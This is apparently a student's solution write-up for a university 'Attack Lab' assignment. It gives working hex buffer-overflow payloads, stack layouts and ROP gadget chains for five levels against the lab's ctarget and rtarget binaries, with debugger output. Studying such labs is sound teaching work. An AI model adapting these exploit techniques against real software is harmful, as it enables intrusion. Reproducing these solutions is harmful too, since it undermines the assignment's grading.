
The Attack Lab: Understanding Buffer Overflow Bugs
===
20190084 권민재, CSED211

# preface
 Using [gdb-peda](https://github.com/longld/peda) with AT&T syntax.

# Part I: Code Injection Attacks
## Level 1
```shell script
gdb-peda$ disas getbuf
Dump of assembler code for function getbuf:
   0x0000000000401863 <+0>:	sub    $0x18,%rsp
   0x0000000000401867 <+4>:	mov    %rsp,%rdi
   0x000000000040186a <+7>:	callq  0x401aed <Gets>
   0x000000000040186f <+12>:	mov    $0x1,%eax
   0x0000000000401874 <+17>:	add    $0x18,%rsp
   0x0000000000401878 <+21>:	retq   
End of assembler dump.
```

```shell script
gdb-peda$ p touch1
$1 = {void ()} 0x401879 <touch1>
```

```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
79 18 40 00 00 00 00 00
```

```shell script
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol1.hex | ./hex2raw | ./ctarget -q
Cookie: 0x78960173
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 79 18 40 00 00 00 00 00
```

## Level 2

```shell script
gdb-peda$ b *0x0000000000401863
Breakpoint 5 at 0x401863: file buf.c, line 12.
gdb-peda$ r -q
Starting program: /home/beta/beta/CSED/CSED211/ASSN/ASSN3/ctarget -q
Cookie: 0x78960173

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x55586000 --> 0x0 
RCX: 0xc ('\x0c')
RDX: 0x7ffff7dd3780 --> 0x0 
RSI: 0xc ('\x0c')
RDI: 0x60701c --> 0xa333731303639 ('960173\n')
RBP: 0x55685fe8 --> 0x4030e5 --> 0x3a6968003a697168 ('hqi:')
RSP: 0x5560d650 --> 0x401a32 (<test+14>:	mov    %eax,%edx)
RIP: 0x401863 (<getbuf>:	sub    $0x18,%rsp)
R8 : 0x7ffff7fcd700 (0x00007ffff7fcd700)
R9 : 0xc ('\x0c')
R10: 0x4033f4 ("Type string:")
R11: 0x7ffff7b7fa30 (<__memset_avx2>:	vpxor  %xmm0,%xmm0,%xmm0)
R12: 0x2 
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x212 (carry parity ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401859 <scramble+1226>:	callq  0x400cf0 <__stack_chk_fail@plt>
   0x40185e <scramble+1231>:	add    $0x38,%rsp
   0x401862 <scramble+1235>:	retq   
=> 0x401863 <getbuf>:	sub    $0x18,%rsp
   0x401867 <getbuf+4>:	mov    %rsp,%rdi
   0x40186a <getbuf+7>:	callq  0x401aed <Gets>
   0x40186f <getbuf+12>:	mov    $0x1,%eax
   0x401874 <getbuf+17>:	add    $0x18,%rsp
[------------------------------------stack-------------------------------------]
0000| 0x5560d650 --> 0x401a32 (<test+14>:	mov    %eax,%edx)
0008| 0x5560d658 --> 0x2 
0016| 0x5560d660 --> 0x401fc9 (<launch+112>:	cmpl   $0x0,0x203558(%rip)        # 0x605528 <is_checker>)
0024| 0x5560d668 --> 0x0 
0032| 0x5560d670 --> 0xf4f4f4f4f4f4f4f4 
0040| 0x5560d678 --> 0xf4f4f4f4f4f4f4f4 
0048| 0x5560d680 --> 0xf4f4f4f4f4f4f4f4 
0056| 0x5560d688 --> 0xf4f4f4f4f4f4f4f4 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 5, getbuf () at buf.c:12
12	in buf.c
```

```shell script
gdb-peda$ vmm 0x5560d650
Start              End                Perm	Name
0x55586000         0x55686000         rwxp	mapped
```

```
gdb-peda$ p touch2
$2 = {void (unsigned int)} 0x4018a5 <touch2>

```

```
buf
stack add. (rsp + 24) 0
argument 8
touch2 16
pop rdi 24
ret 32
```
```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
68 d6 60 55 00 00 00 00
73 01 96 78 00 00 00 00
a5 18 40 00 00 00 00 00
5f
c3
```

```shell script
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol2.hex | ./hex2raw | ./ctarget -q
Cookie: 0x78960173
Type string:Touch2!: You called touch2(0x78960173)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:ctarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 68 D6 60 55 00 00 00 00 73 01 96 78 00 00 00 00 A5 18 40 00 00 00 00 00 5F C3 
```

## Level 3
```
gdb-peda$ p touch3
$2 = {void (char *)} 0x4019b6 <touch3>
```
```
buf
stack add. (rsp + 40)  <= 0
argument (rsp + 24) 8
touch3 add. (touch3) 16
string 24
null 32
pop rdi 40
retq 48
```
```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 d6 60 55 00 00 00 00
68 d6 60 55 00 00 00 00
b6 19 40 00 00 00 00 00
37 38 39 36 30 31 37 33
00 00 00 00 00 00 00 00
5f
c3
```

```
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol3.hex | ./hex2raw | ./ctarget -q
Cookie: 0x78960173
Type string:Touch3!: You called touch3("78960173")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:ctarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 D6 60 55 00 00 00 00 68 D6 60 55 00 00 00 00 B6 19 40 00 00 00 00 00 37 38 39 36 30 31 37 33 00 00 00 00 00 00 00 00 5F C3
```

# rtarget
## farm
```
gdb-peda$ p start_farm
$3 = {<text variable, no debug info>} 0x401a4d <start_farm>
gdb-peda$ p mid_farm
$4 = {<text variable, no debug info>} 0x401a89 <mid_farm>
gdb-peda$ p end_farm
$5 = {<text variable, no debug info>} 0x401b6c <end_farm>

```
## Level 2
```
gdb-peda$ ropsearch "pop rdi" 0x401a53 0x401b6c
Searching for ROP gadget: 'pop rdi' in range: 0x401a53 - 0x401b6c
Not found
```

```
gdb-peda$ ropsearch "mov ?, rdi" 0x401a53 0x401b6c
Searching for ROP gadget: 'mov ?, rdi' in range: 0x401a53 - 0x401b6c
0x00401a70 : (b'4889c7c3')	mov %rax,%rdi; retq
0x00401a62 : (b'4889c7c3')	mov %rax,%rdi; retq
0x00401a69 : (b'4889c792c3')	mov %rax,%rdi; xchg %eax,%edx; retq
```

```
gdb-peda$ ropsearch "pop rax" 0x401a53 0x401b6c
Searching for ROP gadget: 'pop rax' in range: 0x401a53 - 0x401b6c
0x00401ad3 : (b'5889e0c3')	pop %rax; mov %esp,%eax; retq
0x00401a84 : (b'58909090c3')	pop %rax; nop; nop; nop; retq
0x00401a55 : (b'58909090c3')	pop %rax; nop; nop; nop; retq

```

```
gdb-peda$ disas 0x00401a84
Dump of assembler code for function getval_330:
   0x0000000000401a83 <+0>:	mov    $0x90909058,%eax
   0x0000000000401a88 <+5>:	retq   
End of assembler dump.

```

```
gdb-peda$ x/5i 0x00401a84
   0x401a84 <getval_330+1>:	pop    %rax
   0x401a85 <getval_330+2>:	nop
   0x401a86 <getval_330+3>:	nop
   0x401a87 <getval_330+4>:	nop
   0x401a88 <getval_330+5>:	retq
```
```
gdb-peda$ disas 0x00401a70
Dump of assembler code for function addval_138:
   0x0000000000401a6e <+0>:	lea    -0x3c3876b8(%rdi),%eax
   0x0000000000401a74 <+6>:	retq   
End of assembler dump.
```

```
gdb-peda$ x/2i 0x00401a70
   0x401a70 <addval_138+2>:	mov    %rax,%rdi
   0x401a73 <addval_138+5>:	retq   
```

```
buf
gadget pop rax, ret
cookie
gadget mov rax, rdi
touch2
```
```
gdb-peda$ p touch2
$6 = {void (unsigned int)} 0x4018a5 <touch2>

```
```python
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
84 1a 40 00 00 00 00 00
73 01 96 78 00 00 00 00
70 1a 40 00 00 00 00 00
a5 18 40 00 00 00 00 00
```

```
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol4.hex | ./hex2raw | ./rtarget -q
Cookie: 0x78960173
Type string:Touch2!: You called touch2(0x78960173)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 84 1A 40 00 00 00 00 00 73 01 96 78 00 00 00 00 70 1A 40 00 00 00 00 00 A5 18 40 00 00 00 00 00 
```

## Level 3

```
gdb-peda$ ropsearch "add ?, ?" 0x401a53 0x401b6c
Searching for ROP gadget: 'add ?, ?' in range: 0x401a53 - 0x401b6c
0x00401a91 : (b'0437c3')	add $0x37,%al; retq
0x00401a8c : (b'0000c3')	add %al,(%rax); retq
0x00401a8a : (b'01000000c3')	add %eax,(%rax); add %al,(%rax); retq
0x00401a8d : (b'00c3488d0437c3')	add %al,%bl; lea (%rdi,%rsi,1),%rax; retq
0x00401a8b : (b'000000c3488d0437c3')	add %al,(%rax); add %al,%bl; lea (%rdi,%rsi,1),%rax; retq
```

```
gdb-peda$ disas 0x00401a91
Dump of assembler code for function add_xy:
   0x0000000000401a8f <+0>:	lea    (%rdi,%rsi,1),%rax
   0x0000000000401a93 <+4>:	retq   
End of assembler dump.
gdb-peda$ x/2i 0x00401a91
   0x401a91 <add_xy+2>:	add    $0x37,%al
   0x401a93 <add_xy+4>:	retq   
```




```
gdb-peda$ ropsearch "mov ?, ?" 0x401a53 0x401b6c
Searching for ROP gadget: 'mov ?, ?' in range: 0x401a53 - 0x401b6c
... (생략)
0x00401afa : (b'4889e0c3')	mov %rsp,%rax; retq
... (생략)
```

```
gdb-peda$ disas 0x00401afa
Dump of assembler code for function setval_426:
   0x0000000000401af8 <+0>:	movl   $0xc3e08948,(%rdi)
   0x0000000000401afe <+6>:	retq   
End of assembler dump.
gdb-peda$ x/2i 0x00401afa
   0x401afa <setval_426+2>:	mov    %rsp,%rax
   0x401afd <setval_426+5>:	retq 
```

```
gdb-peda$ p touch3
$7 = {void (char *)} 0x4019b6 <touch3>
```

```
buf
mov rsp, rax
add 0x37, al
mov rax, rdi
touch3
buf (23 byte)
37 38 39 36 30 31 37 33
```

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
fa 1a 40 00 00 00 00 00
91 1a 40 00 00 00 00 00
70 1a 40 00 00 00 00 00
b6 19 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00
37 38 39 36 30 31 37 33
00
```

```
 beta@plus  ~/beta/CSED/CSED211/ASSN/ASSN3   master ●  cat sol5.hex | ./hex2raw | ./rtarget -q
Cookie: 0x78960173
Type string:Touch3!: You called touch3("78960173")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
	user id	84
	course	15213-f15
	lab	attacklab
	result	84:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FA 1A 40 00 00 00 00 00 91 1A 40 00 00 00 00 00 70 1A 40 00 00 00 00 00 B6 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 37 38 39 36 30 31 37 33 00 

```